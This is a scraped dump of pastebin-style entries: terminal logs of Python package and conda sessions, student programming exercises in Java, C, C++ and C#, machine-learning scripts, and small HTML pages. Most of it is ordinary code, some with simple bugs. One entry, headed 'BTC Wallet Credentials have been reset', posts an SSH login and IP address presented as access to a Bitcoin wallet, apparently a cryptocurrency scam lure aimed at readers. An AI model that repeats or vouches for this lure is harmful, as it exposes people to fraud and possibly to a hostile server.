~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE > cd ~/Downloads                                            py base 17:36:31
~/Downloads > pip install pyodbc-5.0.1.tar.gz                                                  py base 17:37:09
Processing ./pyodbc-5.0.1.tar.gz
  Installing build dependencies ... done
  Getting requirements to build wheel ... done
  Installing backend dependencies ... done
  Preparing metadata (pyproject.toml) ... done
Building wheels for collected packages: pyodbc
  Building wheel for pyodbc (pyproject.toml) ... done
  Created wheel for pyodbc: filename=pyodbc-5.0.1-cp311-cp311-macosx_10_9_x86_64.whl size=68094 sha256=0c0e25974999c24e9e32ee5e7dcb6f92a32f46554120a96da296890821c8ad41
  Stored in directory: /Users/kip/Library/Caches/pip/wheels/1c/90/07/c456fd44c8d93c7d1ec69fd3ee501439c123978e70cd0b8fa4
Successfully built pyodbc
Installing collected packages: pyodbc
  Attempting uninstall: pyodbc
    Found existing installation: pyodbc 5.0.1
    Uninstalling pyodbc-5.0.1:
      Successfully uninstalled pyodbc-5.0.1
Successfully installed pyodbc-5.0.1
~/Downloads >                                                                               6s py base 17:37:25
~/Downloads >                                                                                  py base 17:37:27
~/Downloads > cd ~/Documents/PYTHON/JUPYTER_ROOT/AICORE/AZURE                                  py base 17:37:27
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE > python3 ./sql2.py                                         py base 17:37:49
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >                                                           py base 17:37:57
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >                                                           py base 17:37:58
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE > python3 ./sql2.py                                         py base 17:37:58
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >                                                           py base 17:38:01
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >"
5cvNz5Ju,Untitled,pezeze,Java,Tuesday 21st of November 2023 11:26:40 AM CDT,"import java.util.Scanner;

public class QuizGame {
    // Store questions in a static variable because we need to manipulate it later.
	// An array, in this case, is the best solution as it allows easy traversal.
    private static String[] questions = {
        ""In what US State is the city Nashville?"",
        ""What is the currency of Denmark?"",
        ""What is the smallest planet in our solar system?"",
        ""What is the capital of New Zealand?"",
        ""What was the Turkish city of Istanbul called before 1930?""
    };

    // Similar to questions, store it in an array inside the module as it is used
	// in the context of the class and doesn't need to be accessed outside the class.
    private static String[] options = {
        ""A. Georgia B. Tennessee C. Massachusetts D. New Mexico"",
        ""A. Euro B. Krone C. Dinar D. US Dollar"",
        ""A. Elephant B. Mercury C. Venus D. Earth"",
        ""A. London B. Wellington C. New York D. Paris"",
        ""A. Colombo B. Constantinople C. Atlanta D. Alania""
    };

    private static char[] correctAnswers = {'B', 'B', 'B', 'B', 'B'};

    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        
        // init counters
        int questionsLength = questions.length;
        int correctResponses = 0;

        // Start show quiz questions
        for (int i = 0; i < questionsLength; i++) {
            // Here we retrieve one of the questions from the question array and pass it 
			// to our methods. Each method performs its own task, such as displaying the 
			// question and getting user input.
            displayQuestion(i + 1, questions[i], options[i]);
            char userAnswer = getUserAnswer(scanner);
            checkAnswer(userAnswer, correctAnswers[i], correctResponses);
        }

        displayFinalScore(correctResponses, questionsLength);

        // Close the scanner and IO streams
        scanner.close();
    }

    // Move the logic for displaying questions to a separate method. This enhances
	// readability and makes it easier to debug. Additionally, it encapsulates the
	// logic for displaying questions.
    private static void displayQuestion(int questionNumber, String question, String options) {
        System.out.println(""Question "" + questionNumber + "": "" + question);
        System.out.println(""\n"" + options);
    }

    // Once again, move the logic responsible for one of our program steps,
	// showing a tip to the user and getting input using the Scanner module.
    private static char getUserAnswer(Scanner scanner) {
        System.out.print(""\n Your answer (A, B, C, or D): "");
        return Character.toUpperCase(scanner.next().charAt(0));
    }

    // Check the user's answer. Here we use conditions and an ""if-else"" block
	// because we have two branches in our program step logic: the user can answer
	// right or wrong, and we handle both cases.
    private static void checkAnswer(char userAnswer, char correctAnswer, int correctResponses) {
        if (userAnswer == correctAnswer) {
            System.out.println(""Correct!\n"");
            correctResponses++;
        } else {
            System.out.println(""Incorrect. The correct answer is "" + correctAnswer + "".\n"");
        }
    }

    // Here we incapuslate logic of final display view.
    private static void displayFinalScore(int correctResponses, int totalQuestions) {
        int score = (correctResponses / totalQuestions) * 100;
        System.out.println(""Your final score: "" + score + ""%"");
    }
}"
2ax80UUa,ejercicio01,fgallego,C++,Tuesday 21st of November 2023 11:25:59 AM CDT,"#include <raylib.h>
#include <array>
#include <cstdint>
#include <cstdlib>
#include <cassert>
#include <span>
#include <optional>

constexpr uint16_t SCR_WIDTH  { 800 };
constexpr uint16_t SCR_HEIGHT { 600 };

struct RenderComponent{
   uint16_t x{}, y{};
   uint16_t w{}, h{};
   Color c{WHITE};
};
struct PhysicsComponent{
   float x{}, y{};
   float vx{}, vy{};
};

struct Entity {
   RenderComponent*  ren{};
   PhysicsComponent* phy{};
};

// Dará acceso al array devolviendolo por referencia constante
struct EntityManager {
   static constexpr std::size_t MAX_ENTITIES { 100 };

   Entity& newEntity() noexcept {
      assert(alive_ < MAX_ENTITIES);
      
      alive_ += 1;
      return entities_[alive_ - 1];
   }

   std::size_t freeEntities() const noexcept { return MAX_ENTITIES - alive_; }

   std::span<Entity const> getEntities() const { 
      return std::span{ entities_.begin(), alive_ }; 
   }
private:
   std::size_t alive_{};
   std::array<Entity, MAX_ENTITIES> entities_{};
};

void render_system(EntityManager& EM) {
   BeginDrawing();
   EndDrawing();
}

int main() {
   InitWindow(SCR_WIDTH, SCR_HEIGHT, ""My Game"");
   EntityManager  EM{};
   
   while ( ! WindowShouldClose() ) {
      //update_entities(EM);
      render_system(EM);
   }

   CloseWindow();
}"
krRH6KAJ,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Tuesday 21st of November 2023 11:25:10 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be: 
josli45:KoE3dG1 on 159.223.212.34
You can connect via SSH.

Regards
BT497416"
AJSzNYSy,Untitled,BABKA_88,Python,Tuesday 21st of November 2023 11:18:40 AM CDT,"import pandas as pd
import numpy as np
from tensorflow.keras.layers import Dense, Conv2D, Flatten
from tensorflow.keras.models import Sequential
from tensorflow.keras.datasets import fashion_mnist
from tensorflow.keras.optimizers import Adam


def load_train(path):    
    train_datagen = ImageDataGenerator(validation_split = 0.25,
                                rescale=1./255,
#                                 vertical_flip = True,
#                                 horizontal_flip = True,
#                                 width_shift_range = 0.2,
#                                 height_shift_range = 0.2,
#                                 rotation_range = 90
                                      )
    
    train_datagen_flow = train_datagen.flow_from_directory(
                                        path,
                                        target_size=(150, 150),
                                        batch_size=16,
                                        class_mode='sparse',
                                        subset='training',
                                        seed=12345)
                                       
    features, target = next(train_datagen_flow)
    return features, target



def create_model(input_shape):
    optimazer = Adam(lr=0.01)
    model = Sequential()
    model.add(Conv2D(filters=4, kernel_size=(3, 3), 
                     input_shape=input_shape,
                     activation='relu'))
    
    model.add(Conv2D(filters=4, kernel_size=(3, 3), 
                     activation='relu'))
    
    model.add(Flatten())
    model.add(Dense(units=10, activation='softmax'))
    model.compile(optimizer='adam', loss='sparse_categorical_crossentropy',
                  metrics=['acc'])

    return model 


def train_model(model, train_data, test_data, batch_size=32, epochs=5,
                steps_per_epoch=None, validation_steps=None):

    features_train, target_train = train_data
    features_test, target_test = test_data
    model.fit(features_train, target_train, 
              validation_data=(features_test, target_test),
              batch_size=batch_size, epochs=epochs,
              steps_per_epoch=steps_per_epoch,
              validation_steps=validation_steps,
              verbose=2, shuffle=True)

    return model "
KxZfr6xz,decorator_approach,bAngelov,Python,Tuesday 21st of November 2023 11:09:45 AM CDT,"class Some:

    def __init__(self, strng):
        self.strng = strng

    @staticmethod
    def type_check(type: (int, float, str), message = ""Incorrect data type.""):
        def decorator(func):
            def wrapper(self, *args):
                if not all(isinstance(arg, type) for arg in args):
                    raise ValueError(message)
                return func(*args)
            return wrapper
        return decorator

    @staticmethod
    @type_check((int, float))
    def check_int(func):
        def decorator(*args):
            return func(*args)
        return decorator

    @property
    def strng(self):
        return self.__strng

    @strng.setter
    @check_int
    def strng(self, value):
        self.__strng = value"
dtt1BkBR,Untitled,Josif_tepe,C,Tuesday 21st of November 2023 11:05:51 AM CDT,"#include <stdio.h>


void rekurzija(int n) {
    if(n == 0) {
        return;
    }
    int cifra = n % 10;
    rekurzija(n / 10);
    printf(""%c"", 'A' + cifra);
}
int main (int argc, const char * argv[]) {
    int n;
    scanf(""%d"", &n);
    
    rekurzija(n);
    return 0;
}

// rekurzija(5608) = rekurzija(560)    | print(F)
// rekurzija(560) = rekurzija(56)      | print(G)
// rekurzija(56) = rekurzija(5)        | print(A)
// rekurzija(5) = rekurzija(0)         | print(I)
// rekurzija(0)
"
LDnJ9NLC,Mandelbrot_Set.html,here2share,JavaScript,Tuesday 21st of November 2023 10:55:55 AM CDT,"Mandelbrot_Set.html
<!DOCTYPE html>
<html>
<head>
    <meta charset=""utf-8"">
    <title>Mandelbrot Set</title>
    <style>
        canvas {
            border: 1px solid black;
        }
    </style>
</head>
<body>
    <canvas id=""canvas"" width=""500"" height=""500""></canvas>
    <script>
        var canvas = document.getElementById(""canvas"");
        var ctx = canvas.getContext(""2d"");

        var xRange = 3.5;
        var yRange = 2.0;
        var xOffset = -0.75;
        var yOffset = 0.0;
        var colors = [];

		function z(r, g, b) {
		  colors.push([r, g, b]);
		}

		let r = 255, g = 0, b = 0;

		for (let g = 0; g < 256; g++) {
		  z(r, g, b);
		}

		for (r = 254; r >= 0; r--) {
		  z(r, g, b);
		}

		for (let b = 0; b < 256; b++) {
		  z(r, g, b);
		}

		for (g = 254; g >= 0; g--) {
		  z(r, g, b);
		}

		for (r = 0; r < 256; r++) {
		  z(r, g, b);
		}

		for (let b = 254; b >= 0; b--) {
		  z(r, g, b);
		}
		
        var numColors = colors.length;

        function calculateMandelbrot(xRange, yRange, xOffset, yOffset) {
            var imageData = ctx.createImageData(canvas.width, canvas.height);
            var data = imageData.data;

            for (var y = 0; y < canvas.height; y++) {
                for (var x = 0; x < canvas.width; x++) {
                    var zx = 0;
                    var zy = 0;
                    var cx = (x - canvas.width / 2) * xRange / canvas.width + xOffset;
                    var cy = (y - canvas.height / 2) * yRange / canvas.height + yOffset;
                    var i = 0;

                    while (zx * zx + zy * zy < 4 && i < 500) {
                        var xt = zx * zx - zy * zy + cx;
                        zy = 2 * zx * zy + cy;
                        zx = xt;
                        i++;
                    }
					
					var i = Math.floor(i * 20 + yRange) % numColors;
                    var index = (x + y * canvas.width) * 4;
                    data[index + 0] = colors[i][0];
                    data[index + 1] = colors[i][1];
                    data[index + 2] = colors[i][2];
                    data[index + 3] = 255;
                }
            }

            ctx.putImageData(imageData, 0, 0);
        }

        calculateMandelbrot(xRange, yRange, xOffset, yOffset);

        var zoomFactor = 1.12;
        var dragStart = null;

        canvas.addEventListener(""wheel"", function(event) {
            event.preventDefault();

            var x = event.clientX - canvas.offsetLeft;
            var y = event.clientY - canvas.offsetTop;

            var zx = (x - canvas.width / 2) * xRange / canvas.width + xOffset;
            var zy = (y - canvas.height / 2) * yRange / canvas.height + yOffset;

            if (event.deltaY < 0) {
                xRange /= zoomFactor;
                yRange /= zoomFactor;
            } else {
                xRange *= zoomFactor;
                yRange *= zoomFactor;
            }

            xOffset = zx - (x - canvas.width / 2) * xRange / canvas.width;
            yOffset = zy - (y - canvas.height / 2) * yRange / canvas.height;

            calculateMandelbrot(xRange, yRange, xOffset, yOffset);
        });

        canvas.addEventListener(""mousedown"", function(event) {
            dragStart = {
                x: event.clientX,
                y: event.clientY,
                xOffset: xOffset,
                yOffset: yOffset
            };
        });

        canvas.addEventListener(""mouseup"", function(event) {
            dragStart = null;
        });

        canvas.addEventListener(""mousemove"", function(event) {
            if (dragStart) {
                var xDelta = event.clientX - dragStart.x;
                var yDelta = event.clientY - dragStart.y;

                xOffset = dragStart.xOffset - xDelta * xRange / canvas.width;
                yOffset = dragStart.yOffset - yDelta * yRange / canvas.height;

                calculateMandelbrot(xRange, yRange, xOffset, yOffset);
            }
        });

        document.addEventListener(""keydown"", function(event) {
            if (event.keyCode == 38) {
                xRange /= zoomFactor;
                yRange /= zoomFactor;

                calculateMandelbrot(xRange, yRange, xOffset, yOffset);
            } else if (event.keyCode == 40) {
                xRange *= zoomFactor;
                yRange *= zoomFactor;

                calculateMandelbrot(xRange, yRange, xOffset, yOffset);
            }
        });
    </script>
</body>
</html>"
aU8tFqcW,Untitled,Josif_tepe,C,Tuesday 21st of November 2023 10:53:37 AM CDT,"#include <stdio.h>


int samoglaska(char c) {
    if(c == 'a' || c == 'e' || c == 'i' || c == 'o' || c == 'u') {
        return 1;
    }
    else {
        return 0;
    }
}
int main (int argc, const char * argv[]) {
    int n;
    scanf(""%d"", &n);
    
    char prethoden = '0';
    int parovi = 0;
    for(int i = 0; i < n; i++) {
        char c;
        scanf("" %c"", &c);
        
        if(prethoden != '0') {
            if(samoglaska(c)) {
                if(!samoglaska(prethoden)) {
                    parovi++;
                }
            }
            else {
                if(samoglaska(prethoden)) {
                    parovi++;
                }
            }
        }
        prethoden = c;
    }
    printf(""%d\n"", parovi);
    return 0;
}

// a e о g h a h i o f f a m n
// rekurzja() = rekurzija() + 0
// rekruzija() = rekurzija() + 1
// rekurzija() = rekurzija() + 0
// rekurzija() = rekurzija() + 0
// rekurzija() = rekruzija() + 1
"
eY8T3z0t,Untitled,nicuvlad76,C++,Tuesday 21st of November 2023 10:44:32 AM CDT,"#include <iostream>
#define N 105
using namespace std;

int ** retea(int n)
{
    int **a, i,j;
    a=new int *[n];
    for(i=0;i<n;++i) a[i]=new int[n];

    for(i=0;i<n;++i)
      for(j=0;j<n;++j) a[i][j]=0;

    for(i=1;i<n;++i)a[0][i]=a[i][0]=1;///server
    for(i=1;i<n;++i)
        if(i==1) a[i][n-1]=a[n-1][i]=1;
        else if(i<n-2)
        {
            a[i][i+1]=a[i+1][i]=1;
            a[i][i-1]=a[i-1][i]=1;
        }
        else { a[i][i-1]=a[i-1][i]=1;}
    return a;
}
int main()
{
  int **x,n;
  cin>>n;
  x=retea(n);
  for(int i=0;i<n;++i,cout<<""\n"")
    for(int j=0;j<n;++j)
      cout<<x[i][j]<<"" "";
  return 0;
}
"
tAynT9K4,Untitled,Sininerebane,C#,Tuesday 21st of November 2023 10:38:44 AM CDT,"Задача
При помощи всего, что вы изучили, создать приложение, которое может обрабатывать команды. Т.е. вы создаете меню, ожидаете ввода нужной команды, после чего выполняете действие, которое присвоено этой команде.
Примеры команд (требуется 4-6 команд, придумать самим):
SetName – установить имя;
ChangeConsoleColor- изменить цвет консоли;
SetPassword – установить пароль;
WriteName – вывести имя (после ввода пароля);
Esc – выход из программы.
Программа не должна завершаться после ввода, пользователь сам должен выйти из программы при помощи команды.

namespace Othertask
{
    internal class Program
    {
        static void Main(string[] args)
        {
            Console.OutputEncoding = Encoding.UTF8;
            string userInput;
            int setColor;

            const string CommandSetName = ""1"";
            const string CommandChangeColor = ""2"";
            const string CommandSetPassword = ""3"";
            const string CommandDisplayName = ""4"";
            const string CommandExit = ""5"";

            string setPassword;
            string setName;
            string currentPassword = ""123456"";
            bool isActive = true;

            while (isActive)
           {
                Console.WriteLine(""Выберите нужную команду"");
                Console.WriteLine(""\n 1- Установить имя. \n2- Изменить цвет консоли. \n3- Установить пароль. \n4- Вывести имя. \n5- Выход из программы"");

                userInput = Console.ReadLine();

                switch (userInput)
                {

                    case CommandSetName:
                        Console.Write(""Установите имя:"");
                        setName = Console.ReadLine();
                        Console.Clear();
                        break;

                    case CommandChangeColor:
                        Console.WriteLine(""Вы собираетесь поменять цвет консоли.\n Выберете цвет"");
                        Console.Write(""1: Красный. \n 2: Зеленный "");
                        setColor = Convert.ToInt32(Console.ReadLine());

                        if (setColor == 1)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.Clear();
                        }
                        
                        else if (setColor == 2)
                        {
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.Clear();

                        }

                        break;

                    case CommandSetPassword:
                        Console.Write(""Установите пароль:"");
                        setPassword = Console.ReadLine();
                        Console.Clear();
                        break;

                    case CommandDisplayName:
                        Console.WriteLine(""Если вы введете верный пароль вы сможете установить имя"");
                        Console.Write(""Введите пароль: "");
                        setPassword = Console.ReadLine();

                        if (setPassword == currentPassword)
                        {

                            Console.WriteLine(""Введите ваше имя:"");
                            setName = Console.ReadLine();
                            Console.WriteLine(""Имя пользователя: "" + setName);
                        }
                        
                        else
                        {
                            Console.WriteLine(""Пароль неверный."");
                        }

                        break;

                    case CommandExit:
                        Console.WriteLine(""Вы вышли из меню!"");
                        isActive = false;
                        break;

                }
            }
        }
    }
}
"
FD7c8C6b,Untitled,Josif_tepe,C,Tuesday 21st of November 2023 10:37:48 AM CDT,"#include <stdio.h>

int rekurzija() {
    int x;
    if(scanf(""%d"", &x)) {
        int posledna_cifra = x % 10;
        int brojac = 0;
        if(posledna_cifra % 3 == 0) {
            brojac = 1;
        }
        return rekurzija() + brojac;
    }
    else {
        return 0;
    }
}
int main (int argc, const char * argv[]) {
    printf(""%d\n"", rekurzija());
   
    return 0;
}

// rekurzija() = rekurzija() + 1
// rekurzja() = rekurzija() + 0
// rekruzija() = rekurzija() + 1
// rekurzija() = rekurzija() + 0
// rekurzija() = rekurzija() + 0
// rekurzija() = rekruzija() + 1
"
BHRjwi33,USB_audio.html,duggabe,HTML,Tuesday 21st of November 2023 10:30:26 AM CDT,"<!DOCTYPE html>
<html>
<head>
<meta charset=""utf-8"">
<title>USB Audio</title>
</head>
 
<body>
<div id=""container"">
	<audio id=""audioElement"" controls autoplay muted>
	</audio>
</div>
<button type=""button"" onclick=""get_device()"">Activate</button> 
<script>
function get_device()
    {
    if (navigator.mediaDevices.getUserMedia)
        {
        navigator.mediaDevices.getUserMedia({video: false, audio: true})
            .then(function (stream) {
                document.querySelector(""#audioElement"").srcObject = stream;
            });
        }
    }
</script>
</body>
</html>"
3M8JpFUi,Untitled,Sininerebane,C#,Tuesday 21st of November 2023 10:27:36 AM CDT,"Задача
Написать конвертер валют (3 валюты).
У пользователя есть баланс в каждой из представленных валют. Он может попросить сконвертировать часть баланса с одной валюты в другую. Тогда у него с баланса одной валюты снимется X и зачислится на баланс другой Y. Курс конвертации должен быть просто прописан в программе.
По имени переменной курса конвертации должно быть понятно, из какой валюты в какую валюту конвертируется.
Должна выполняться однотипная операция или везде умножение ""*"" или деление ""/"". Для чего это нужно подробнее позже узнаете в разделе ""Функции"". Но придётся объявить коэффициенты на все случаи.
 
Программа должна завершиться тогда, когда это решит пользователь.
 
Дополнительно: Если решение строится на switch, то принято работать с константами (в остальных случаях объявляются переменные). Для каждого case следует объявить константу.
Пример:
const string CommandExit = ""exit"";
 
case CommandExit:
break;
 
Константы объявляются перед блоком переменных и отделяются от них пустой строкой. Константы именуются с большой буквы. Если константа создана для связки консольное меню + switch (case) к имени константы добавляется Command или Menu - это передает суть константы, превращая ее в существительное, а не глагол и улучшает читаемость кода

namespace ConvertorValut
{
    internal class Program
    {
        static void Main(string[] args)
        {
 
            const string RubToEurCommand = ""1"";
            const string EurToRubCommand = ""2"";
            const string RubToUsdCommand = ""3"";            
            const string UsdToRubCommand = ""4"";
            const string EurToUsdCommand = ""5"";
            const string UsdToEurCommand = ""6"";
            
            Console.OutputEncoding = Encoding.UTF8;
            float rubToEur;
            float eurToRub;
            float usdToRub;
            float rubToUsd;
            float eurToUsd;
            float UsdToEur;
            float rub;
            float euro;
            float usd;
            string userInput;
            float currencyCount;
 
            rubToEur = 0.01F;
            eurToRub = 98.29F;
            usdToRub = 91.68F;
            rubToUsd = 0.011F;
            eurToUsd = 0.92F;
            UsdToEur = 1.09F;
 
            Console.WriteLine(""Добро пожаловать в обменник валют. У нас вы можете обменять рубли в евро и евро в рубли, рубли на доллары, доллары на рубли, евро в доллары и доллары в евро "");
            Console.WriteLine(""Введите баланс рублей: "");
            rub = Convert.ToSingle(Console.ReadLine());
            Console.WriteLine(""Введите баланс евро: "");
            euro = Convert.ToSingle(Console.ReadLine());
            Console.WriteLine(""Введите баланс долларов: "");
            usd = Convert.ToSingle(Console.ReadLine());
 
            Console.WriteLine(""1 - обменять рубли на евро"");
            Console.WriteLine(""2 - обменять евро на рубли"");
            Console.WriteLine(""3 - обменять рубли на доллары"");
            Console.WriteLine(""4 - обменять доллары на рубли"");
            Console.WriteLine(""5 - обменять евро на доллары"");
            Console.WriteLine(""6 - обменять долларов на рубли"");
            
            userInput = Console.ReadLine();
 
            switch (userInput)
            {
                case RubToEurCommand:
                    Console.WriteLine(""Обмен рублей на евро"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());
                    if (rub >= currencyCount)
                    {
                        rub -= currencyCount;
                        euro += currencyCount / eurToRub;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество рублей"");
                    }
                    break;
                case EurToRubCommand:
                    Console.WriteLine(""Обмен евро на рубли"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());
                    if ( euro >= currencyCount)
                    {
                        euro -= currencyCount;
                        rub += currencyCount / rubToEur;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество евро"");
                    }
                    break;
                case RubToUsdCommand:
                    Console.WriteLine(""Обмен рублей на доллары"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());
                    if (usd >= currencyCount)
                    {
                        rub -= currencyCount;
                        usd += currencyCount / usdToRub;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество рублей"");
                    }
                    break;
                case UsdToRubCommand:
                    Console.WriteLine(""Обмен долларов на рубли"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());
                    if (usd >= currencyCount)
                    {
                        usd -= currencyCount;
                        rub += currencyCount / rubToUsd;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество долларов"");
                    }
                    break;
                case EurToUsdCommand:
                    Console.WriteLine(""Обмен евро на долларов"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());
                    if (euro >= currencyCount)
                    {
                        euro -= currencyCount;
                        usd += currencyCount / UsdToEur;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество евро"");
                    }
                    break;
                case UsdToEurCommand:
                    Console.WriteLine(""Обмен долларов на евро"");
                    Console.Write(""Сколько вы хотите обменять?: "");
                    currencyCount = Convert.ToSingle(Console.ReadLine());
                    if (usd >= currencyCount)
                    {
                        usd -= currencyCount;
                        euro += currencyCount / eurToUsd;
                    }
                    else
                    {
                        Console.WriteLine(""Недопустимое количество долларов"");
                    }
                    break;
            }
            Console.WriteLine($""Ваш баланс {rub}  рублей и {euro} евро и {usd} долларов "");
            Console.ReadKey();
        }
    }
}"
AGJkwwSG,Untitled,Josif_tepe,C,Tuesday 21st of November 2023 10:27:25 AM CDT,"#include <stdio.h>

double funkcija(int n) {
    double result = 0.5;
    int brojac = 1;
    for(int i = 3; i <= n; i += 2) {
        if(brojac % 2 == 0) {
            result /= ( (double)i / (double)(i + 1) );
        }
        else {
            result *= ( (double)i / (double)(i + 1) );
        }
        brojac++;
    }
    return result;
}
int main (int argc, const char * argv[]) {
    int n;
    scanf(""%d"", &n);
    
   
    printf(""%lf\n"", funkcija(n));
   
    return 0;
}

"
h2NqPrvZ,Untitled,Josif_tepe,C++,Tuesday 21st of November 2023 10:25:13 AM CDT,"#include <stdio.h>


int main (int argc, const char * argv[]) {
    int n;
    scanf(""%d"", &n);
    
    double result = 0.5;
    int brojac = 1;
    for(int i = 3; i <= n; i += 2) {
        if(brojac % 2 == 0) {
            result /= ( (double)i / (double)(i + 1) );
        }
        else {
            result *= ( (double)i / (double)(i + 1) );
        }
        brojac++;
    }
    printf(""%lf\n"", result);
   
    return 0;
}

"
k8eyhqRd,Untitled,kopyl,Python,Tuesday 21st of November 2023 10:20:33 AM CDT,"import argparse
from onediff.infer_compiler import oneflow_load_compiled
from onediff.infer_compiler import oneflow_compile
from onediff import EulerDiscreteScheduler, rewrite_self_attention
from diffusers import StableDiffusionPipeline
import oneflow as flow
import torch
import os


def parse_args():
    parser = argparse.ArgumentParser(description=""Simple demo of image generation."")
    parser.add_argument(""--compiled_graph_path"", type=str, default=""compiled-graph"")
    parser.add_argument(
        ""--prompt"", type=str, default=""an icon of a dog""
    )
    parser.add_argument(
        ""--model_id"", type=str, default=""runwayml/stable-diffusion-v1-5"",
    )
    parser.add_argument(""--height"", type=int, default=512)
    parser.add_argument(""--width"", type=int, default=512)
    parser.add_argument(""--steps"", type=int, default=30)
    parser.add_argument(""--warmup"", type=int, default=1)
    parser.add_argument(""--seed"", type=int, default=1)
    args = parser.parse_args()
    return args


args = parse_args()

scheduler = EulerDiscreteScheduler.from_pretrained(args.model_id, subfolder=""scheduler"")
pipe = StableDiffusionPipeline.from_pretrained(
    args.model_id,
    scheduler=scheduler,
    use_auth_token=True,
    revision=""fp16"",
    variant=""fp16"",
    torch_dtype=torch.float16,
    safety_checker=None,
)
pipe = pipe.to(""cuda"")


compiled_graph_exists = os.path.exists(args.compiled_graph_path)

if not compiled_graph_exists:
    rewrite_self_attention(pipe.unet)
    pipe.unet = oneflow_compile(pipe.unet)
else:
    pipe.unet = oneflow_load_compiled(pipe.unet, args.compiled_graph_path)

prompt = args.prompt
with flow.autocast(""cuda""):
    torch.manual_seed(args.seed)

    images = pipe(
        prompt, height=args.height, width=args.width, num_inference_steps=args.steps
    ).images
    if not compiled_graph_exists:
        print(""Saving compiled graph"")
        pipe.unet.save_graph(args.compiled_graph_path)
    for i, image in enumerate(images):
        image.save(f""{prompt}-of-{i}-seed-{args.seed}.png"")
"
GAPDGR3z,Untitled,umbongodrink,Bash,Tuesday 21st of November 2023 10:17:08 AM CDT,"~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE >                                                           py base 16:07:24
~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE > conda env list                                            py base 16:07:24
# conda environments:
#
base                  *  /Users/kip/miniconda
azureenv                 /Users/kip/miniconda/envs/azureenv
env_hangman_1            /Users/kip/miniconda/envs/env_hangman_1
kubeenv                  /Users/kip/miniconda/envs/kubeenv
sql1                     /Users/kip/miniconda/envs/sql1
                         /Users/kip/opt/anaconda3
                         /opt/homebrew/Caskroom/miniconda/base

~/Doc/PY/JUPYTER_ROOT/AICORE/AZURE > conda activate azureenv                                   py base 16:12:13
~/Doc/PY/J/AICORE/AZURE > conda list                                                       py azureenv 16:12:26
# packages in environment at /Users/kip/miniconda/envs/azureenv:
#
# Name                    Version                   Build  Channel
appnope                   0.1.3              pyhd8ed1ab_0    conda-forge
asttokens                 2.4.1              pyhd8ed1ab_0    conda-forge
azure-core                1.29.5                   pypi_0    pypi
azure-storage-blob        12.19.0                  pypi_0    pypi
backports                 1.0                pyhd8ed1ab_3    conda-forge
backports.functools_lru_cache 1.6.5              pyhd8ed1ab_0    conda-forge
bzip2                     1.0.8                h1de35cc_0
ca-certificates           2023.11.17           h8857fd0_0    conda-forge
certifi                   2023.11.17               pypi_0    pypi
cffi                      1.16.0                   pypi_0    pypi
charset-normalizer        3.3.2                    pypi_0    pypi
comm                      0.1.4              pyhd8ed1ab_0    conda-forge
cryptography              41.0.5                   pypi_0    pypi
debugpy                   1.8.0           py311hdf8f085_1    conda-forge
decorator                 5.1.1              pyhd8ed1ab_0    conda-forge
exceptiongroup            1.1.3              pyhd8ed1ab_0    conda-forge
executing                 2.0.1              pyhd8ed1ab_0    conda-forge
idna                      3.4                      pypi_0    pypi
importlib-metadata        6.8.0              pyha770c72_0    conda-forge
importlib_metadata        6.8.0                hd8ed1ab_0    conda-forge
ipykernel                 6.26.0             pyh3cd1d5f_0    conda-forge
ipython                   8.17.2             pyh31c8845_0    conda-forge
isodate                   0.6.1                    pypi_0    pypi
jedi                      0.19.1             pyhd8ed1ab_0    conda-forge
jupyter_client            8.6.0              pyhd8ed1ab_0    conda-forge
jupyter_core              5.5.0           py311h6eed73b_0    conda-forge
libcxx                    16.0.6               hd57cbcb_0    conda-forge
libffi                    3.4.4                hecd8cb5_0
libsodium                 1.0.18               hbcb3906_1    conda-forge
matplotlib-inline         0.1.6              pyhd8ed1ab_0    conda-forge
ncurses                   6.4                  hcec6c5f_0
nest-asyncio              1.5.8              pyhd8ed1ab_0    conda-forge
openssl                   3.1.4                hd75f5a5_0    conda-forge
packaging                 23.2               pyhd8ed1ab_0    conda-forge
parso                     0.8.3              pyhd8ed1ab_0    conda-forge
pexpect                   4.8.0              pyh1a96a4e_2    conda-forge
pickleshare               0.7.5                   py_1003    conda-forge
pip                       23.3            py311hecd8cb5_0
platformdirs              4.0.0              pyhd8ed1ab_0    conda-forge
prompt-toolkit            3.0.41             pyha770c72_0    conda-forge
prompt_toolkit            3.0.41               hd8ed1ab_0    conda-forge
psutil                    5.9.5           py311h2725bcf_1    conda-forge
ptyprocess                0.7.0              pyhd3deb0d_0    conda-forge
pure_eval                 0.2.2              pyhd8ed1ab_0    conda-forge
pycparser                 2.21                     pypi_0    pypi
pygments                  2.17.1             pyhd8ed1ab_0    conda-forge
python                    3.11.5               hf27a42d_0
python-dateutil           2.8.2              pyhd8ed1ab_0    conda-forge
python_abi                3.11                    2_cp311    conda-forge
pyzmq                     25.1.1          py311he3804a1_2    conda-forge
readline                  8.2                  hca72f7f_0
requests                  2.31.0                   pypi_0    pypi
setuptools                68.0.0          py311hecd8cb5_0
six                       1.16.0             pyh6c4a22f_0    conda-forge
sqlite                    3.41.2               h6c40b1e_0
